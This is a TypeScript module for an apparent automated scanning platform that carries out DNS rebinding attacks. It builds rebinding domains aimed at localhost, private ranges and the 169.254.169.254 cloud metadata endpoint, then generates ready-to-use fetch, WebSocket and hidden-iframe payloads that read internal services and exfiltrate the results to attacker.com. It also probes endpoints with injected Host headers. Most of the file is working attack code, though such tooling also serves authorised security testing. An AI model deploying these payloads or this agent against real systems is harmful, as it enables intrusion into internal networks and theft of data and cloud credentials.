/**
 * DNS Rebinding Agent
 * Based on PayloadsAllTheThings/DNS Rebinding
 * 
 * Exploits DNS rebinding to bypass same-origin policy:
 * - Time-based DNS rebinding
 * - Multiple A record rebinding
 * - DNS cache poisoning
 * - Bypass internal network restrictions
 * - Access localhost services
 * - Exploit IoT devices
 */

import { Job } from 'bullmq';
import { BaseAgent } from './base';
import logger from '../utils/logger';
import database from '../services/database';

interface DNSRebindingJob {
  programId: string;
  scanId: string;
  targetDomain: string;
  internalTargets?: string[];
  options?: {
    rebindToLocalhost?: boolean;
    rebindToInternal?: boolean;
    testPorts?: number[];
    timeout?: number;
  };
}

// DNS Rebinding services from PayloadsAllTheThings
const DNS_REBINDING_SERVICES = {
  // rbndr.us - Simple DNS rebinding service
  rbndr: {
    url: 'https://lock.cmpxchg8b.com/rebinder.html',
    format: (ip1: string, ip2: string) => `${ip1.replace(/\./g, '-')}.${ip2.replace(/\./g, '-')}.rbndr.us`,
  },
  // 1u.ms - Advanced rebinding with timing control
  '1u.ms': {
    url: 'https://github.com/neex/1u.ms',
    format: (ip1: string, ip2: string) => `make-${ip1}-rebind-${ip2}-rr.1u.ms`,
  },
  // nip.io - IP to DNS mapping
  'nip.io': {
    url: 'https://nip.io',
    format: (ip: string) => `${ip}.nip.io`,
  },
  // sslip.io - SSL-enabled IP to DNS
  'sslip.io': {
    url: 'https://sslip.io',
    format: (ip: string) => `${ip}.sslip.io`,
  },
};

// Common internal targets
const INTERNAL_TARGETS = [
  '127.0.0.1',
  '169.254.169.254', // AWS metadata
  '192.168.1.1',     // Common router
  '10.0.0.1',        // Internal network
  '172.16.0.1',      // Internal network
];

// Common ports to test
const COMMON_PORTS = [
  80, 443, 8080, 8443,  // Web
  22, 23,               // SSH/Telnet
  3000, 3001,           // Dev servers
  5000, 5001,           // Flask/API
  6379,                 // Redis
  27017,                // MongoDB
  9200,                 // Elasticsearch
  8500,                 // Consul
  2375, 2376,           // Docker
];

export class DNSRebindingAgent extends BaseAgent<DNSRebindingJob> {
  constructor() {
    super('dnsrebinding');
  }

  protected getSteps() {
    return [
      { name: 'Identify rebinding targets', metadata: {} },
      { name: 'Generate rebinding domains', metadata: {} },
      { name: 'Test DNS rebinding attacks', metadata: {} },
      { name: 'Probe internal services', metadata: {} },
      { name: 'Generate exploitation payloads', metadata: {} },
    ];
  }

  async process(job: Job<DNSRebindingJob>): Promise<any> {
    const { programId, scanId, targetDomain, internalTargets = INTERNAL_TARGETS, options = {} } = job.data;
    const results: any[] = [];

    logger.info({ targetDomain, internalTargets: internalTargets.length }, 'Starting DNS rebinding analysis');

    // Step 1: Resolve target domain
    const targetIP = await this.resolveDomain(targetDomain);
    if (!targetIP) {
      return { error: 'Could not resolve target domain' };
    }

    // Step 2: Generate rebinding domains for each internal target
    const rebindingPayloads: any[] = [];
    
    for (const internalIP of internalTargets) {
      // Generate rebinding domains using various services
      rebindingPayloads.push({
        targetIP,
        internalIP,
        domains: this.generateRebindingDomains(targetIP, internalIP),
        ports: options.testPorts || COMMON_PORTS,
      });
    }

    // Step 3: Generate attack payloads
    const attackPayloads = this.generateAttackPayloads(targetDomain, rebindingPayloads);

    // Step 4: Check for vulnerable endpoints
    const vulnerableEndpoints = await this.findVulnerableEndpoints(targetDomain);

    // Store findings
    if (vulnerableEndpoints.length > 0 || rebindingPayloads.length > 0) {
      await this.storeFindings(programId, scanId, {
        targetDomain,
        targetIP,
        rebindingPayloads,
        attackPayloads,
        vulnerableEndpoints,
      });
    }

    return {
      targetDomain,
      targetIP,
      rebindingPayloads: rebindingPayloads.length,
      attackPayloads: attackPayloads.length,
      vulnerableEndpoints: vulnerableEndpoints.length,
      payloads: attackPayloads,
    };
  }

  private async resolveDomain(domain: string): Promise<string | null> {
    try {
      // Use DNS resolution
      const dns = require('dns').promises;
      const addresses = await dns.resolve4(domain);
      return addresses[0] || null;
    } catch (error) {
      logger.debug({ error, domain }, 'DNS resolution failed');
      return null;
    }
  }

  private generateRebindingDomains(publicIP: string, internalIP: string): string[] {
    const domains: string[] = [];

    // rbndr.us format
    domains.push(DNS_REBINDING_SERVICES.rbndr.format(publicIP, internalIP));

    // 1u.ms format
    domains.push(DNS_REBINDING_SERVICES['1u.ms'].format(publicIP, internalIP));

    // Direct IP formats
    domains.push(DNS_REBINDING_SERVICES['nip.io'].format(internalIP));
    domains.push(DNS_REBINDING_SERVICES['sslip.io'].format(internalIP));

    // Hex encoding bypass
    const hexIP = internalIP.split('.').map(n => parseInt(n).toString(16).padStart(2, '0')).join('');
    domains.push(`0x${hexIP}.nip.io`);

    // Decimal encoding
    const decimalIP = internalIP.split('.').reduce((acc, octet, i) => 
      acc + parseInt(octet) * Math.pow(256, 3 - i), 0);
    domains.push(`${decimalIP}.nip.io`);

    return domains;
  }

  private generateAttackPayloads(targetDomain: string, rebindingPayloads: any[]): any[] {
    const payloads: any[] = [];

    for (const payload of rebindingPayloads) {
      for (const domain of payload.domains) {
        // Basic fetch-based attack
        payloads.push({
          type: 'fetch',
          domain,
          internalIP: payload.internalIP,
          code: this.generateFetchPayload(domain, payload.ports),
        });

        // WebSocket-based attack
        payloads.push({
          type: 'websocket',
          domain,
          internalIP: payload.internalIP,
          code: this.generateWebSocketPayload(domain, payload.ports),
        });

        // iframe-based attack
        payloads.push({
          type: 'iframe',
          domain,
          internalIP: payload.internalIP,
          code: this.generateIframePayload(domain),
        });
      }
    }

    return payloads;
  }

  private generateFetchPayload(domain: string, ports: number[]): string {
    return `
// DNS Rebinding Attack - Fetch-based
async function dnsRebindingAttack() {
  const domain = '${domain}';
  const ports = ${JSON.stringify(ports)};
  const results = [];

  // Wait for DNS cache to expire and rebind
  await new Promise(r => setTimeout(r, 60000));

  for (const port of ports) {
    try {
      const response = await fetch(\`http://\${domain}:\${port}/\`, {
        mode: 'no-cors',
        credentials: 'include'
      });
      results.push({ port, status: 'accessible' });
    } catch (e) {
      results.push({ port, status: 'blocked' });
    }
  }

  // Exfiltrate results
  navigator.sendBeacon('https://attacker.com/collect', JSON.stringify(results));
  return results;
}

dnsRebindingAttack();
`;
  }

  private generateWebSocketPayload(domain: string, ports: number[]): string {
    return `
// DNS Rebinding Attack - WebSocket-based
function wsRebindingAttack() {
  const domain = '${domain}';
  const ports = ${JSON.stringify(ports)};

  ports.forEach(port => {
    try {
      const ws = new WebSocket(\`ws://\${domain}:\${port}/\`);
      ws.onopen = () => {
        console.log('WebSocket connected on port', port);
        ws.send('{"type":"probe"}');
      };
      ws.onmessage = (e) => {
        // Exfiltrate data
        fetch('https://attacker.com/ws-data', {
          method: 'POST',
          body: JSON.stringify({ port, data: e.data })
        });
      };
    } catch (e) {}
  });
}

// Wait for rebinding then attack
setTimeout(wsRebindingAttack, 60000);
`;
  }

  private generateIframePayload(domain: string): string {
    return `
<!DOCTYPE html>
<html>
<head><title>DNS Rebinding POC</title></head>
<body>
<script>
// Phase 1: Load legitimate content
const iframe = document.createElement('iframe');
iframe.src = 'http://${domain}/';
iframe.style.display = 'none';
document.body.appendChild(iframe);

// Phase 2: After DNS rebind, access internal content
setTimeout(() => {
  try {
    const internalContent = iframe.contentDocument.body.innerHTML;
    // Exfiltrate internal data
    fetch('https://attacker.com/exfil', {
      method: 'POST',
      body: internalContent
    });
  } catch (e) {
    console.log('Same-origin policy blocked access');
  }
}, 120000); // Wait 2 minutes for DNS TTL to expire
</script>
</body>
</html>
`;
  }

  private async findVulnerableEndpoints(domain: string): Promise<any[]> {
    const vulnerableEndpoints: any[] = [];

    // Check for endpoints that might be vulnerable to DNS rebinding
    const endpoints = [
      '/api/',
      '/admin/',
      '/internal/',
      '/debug/',
      '/metrics/',
      '/health/',
      '/status/',
      '/.well-known/',
    ];

    for (const endpoint of endpoints) {
      try {
        const response = await fetch(`http://${domain}${endpoint}`, {
          method: 'GET',
          headers: { 'Host': '127.0.0.1' }, // Test host header injection
        });

        if (response.ok) {
          vulnerableEndpoints.push({
            endpoint,
            status: response.status,
            hostHeaderInjection: true,
          });
        }
      } catch (error) {
        // Endpoint not accessible
      }
    }

    return vulnerableEndpoints;
  }

  private async storeFindings(programId: string, scanId: string, findings: any): Promise<void> {
    try {
      await database.query(
        `INSERT INTO vulnerabilities (program_id, scan_id, type, severity, details, created_at)
         VALUES ($1, $2, 'dns-rebinding', 'high', $3, CURRENT_TIMESTAMP)`,
        [programId, scanId, JSON.stringify(findings)]
      );
    } catch (error) {
      logger.error({ error }, 'Failed to store DNS rebinding findings');
    }
  }
}

export default new DNSRebindingAgent();
